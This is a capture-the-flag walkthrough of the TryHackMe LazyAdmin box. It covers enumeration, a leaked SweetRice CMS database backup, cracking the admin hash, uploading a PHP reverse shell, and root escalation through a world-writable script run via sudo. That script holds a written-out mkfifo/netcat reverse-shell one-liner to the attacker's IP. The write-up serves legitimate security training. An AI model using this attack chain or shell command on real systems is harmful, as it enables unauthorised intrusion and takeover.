@@ -1,0 +1,106 @@
+LazyAdmin – TryHackMe
+
+Overview
+
+LazyAdmin is a vulnerable machine sponsored on TRYHACKME. It is a relaxed box to practice on that will engage the attacker in web application enumeration, hash cracking, using a known CVE against a CMS, and some basic privilege escalation.
+
+User Flag
+
+First, start with an Nmap port scan. This gives us 2 open ports by default.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+As there is an HTTP service running, start GoBuster for directory discovery.
+
+gobuster dir --url http://10.10.80.64 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+This gives us our first finding, a /content directory which shows us a SweetRice CMS. We don’t see the version number here yet, but we can use searchsploit to find if there are known vulnerabilities.
+
+└─$ searchsploit sweetrice                                       
+------------------------------------- ---------------------------------
+ Exploit Title                       |  Path
+------------------------------------- ---------------------------------
+SweetRice 0.5.3 - Remote File Inclus | php/webapps/10246.txt
+SweetRice 0.6.7 - Multiple Vulnerabi | php/webapps/15413.txt
+SweetRice 1.5.1 - Arbitrary File Dow | php/webapps/40698.py
+SweetRice 1.5.1 - Arbitrary File Upl | php/webapps/40716.py
+SweetRice 1.5.1 - Backup Disclosure  | php/webapps/40718.txt
+SweetRice 1.5.1 - Cross-Site Request | php/webapps/40692.html
+SweetRice 1.5.1 - Cross-Site Request | php/webapps/40700.html
+SweetRice < 0.6.4 - 'FCKeditor' Arbi | php/webapps/14184.txt
+------------------------------------- ---------------------------------
+Shellcodes: No Results
+There are a few that stand out here, particularly the 1.5.1 exploits as they will be effective on newer versions of the CMS. I first tried to see how the arbitrary file upload went, but it required a user name and password. If we cat 40718.txt we can see:
+
+Proof of Concept :
+
+You can access to all mysql backup and download them from this directory.
+http://localhost/inc/mysql_backup
+For our use case, the path will contain /content, but there is indeed a downloadable .SQL file.
+
+If we go through this file, we notice the lines:
+
+{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:
+This file contains a user name and a hashed password.
+
+From here we can use hashid to identify the hash, and hashcat or crackstation to obtain the password. We now have a set of credentials to try somewhere. If we return to our directory discovery, we can see:
+
+http://10.10.193.49/content/as/
+Which contains a login portal. We can use our credentials to log in. Notice the CMS version is now displayed as well.
+
+By checking searchsploit again for sweetrice the 40700.html we can see the file explaining a method of uploading arbitrary files into the web application.
+
+By browsing over to the Ads resource, we can upload a reverse shell. I used the one by pentestmonkey.
+
+
+Before browsing to the reverse_shell.php link, set up a netcat listener.
+
+─$ nc -nlvp 31337
+listening on [any] 31337 ...
+connect to [10.13.18.79] from (UNKNOWN) [10.10.193.49] 54058
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 07:52:03 up  1:31,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+It looks like we are www-data.
+By browsing to /home/itguy we can grab the user flag!
+
+Root Flag
+
+The first thing I usually do is upgrade my tty and see if there are any sudo permissions granted to a user.
+
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@THM-Chal:/$ ls
+sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+We can run the Perl command backup.pl, so let’s inspect the file and see what the permissions are.
+
+4 -rw-r--r-x 1 root root 47 nov 29  2019 /home/itguy/backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+The file is owned by root, and calls a Perl script that runs /etc/copy.sh, so we investigate that file next.
+
+4 -rw-r--rwx 1 root root 79 Sep  1 08:13 /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.18.79 5554 >/tmp/f
+We have write permissions of a file which is called from a script running as root, so we can spawn a reverse shell. The file itself already is set up for this, so we just need to echo in our IP and port, then set up a second listener.
+
+listening on [any] 5554 ...
+connect to [10.13.18.79] from (UNKNOWN) [10.10.193.49] 55796
+# cat /root/root.txt
+And with that, we have the root flag!
